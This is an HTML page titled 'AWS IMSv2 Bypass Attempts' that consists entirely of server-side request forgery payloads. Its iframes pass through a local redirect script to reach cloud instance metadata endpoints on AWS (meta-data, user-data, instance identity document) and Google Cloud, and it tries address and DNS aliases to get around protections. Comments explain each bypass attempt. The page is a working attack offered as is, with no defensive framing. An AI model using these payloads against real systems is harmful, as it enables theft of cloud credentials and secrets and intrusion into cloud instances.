<!DOCTYPE html>
<html>
<head>
    <title>AWS IMSv2 Bypass</title>
</head>
<body>
    <h1>AWS IMSv2 Bypass Attempts</h1>
    
    <!-- Try IMSv1 (older API version) -->
    <h3>IMSv1 Metadata Service</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/" width="100%" height="200"></iframe>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/" width="100%" height="200"></iframe>
    
    <!-- Try different user-data endpoints -->
    <h3>User Data Endpoints</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/user-data/" width="100%" height="200"></iframe>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/user-data/" width="100%" height="200"></iframe>
    
    <!-- Try with different headers (some redirectors pass through headers) -->
    <h3>Alternative Endpoints</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/dynamic/instance-identity/document" width="100%" height="300"></iframe>
    
    <!-- Try alternative metadata service IPs -->
    <h3>Alternative Metadata IPs</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254.xip.io/latest/meta-data/" width="100%" height="200"></iframe>
    <iframe src="http://localhost/redir.php?url=http://metadata.google.internal/computeMetadata/v1/instance/" width="100%" height="200"></iframe>
    
    <!-- Try DNS-based metadata access -->
    <h3>DNS-Based Access</h3>
    <iframe src="http://localhost/redir.php?url=http://instance-data.ec2.internal/latest/meta-data/" width="100%" height="200"></iframe>
</body>
</html>
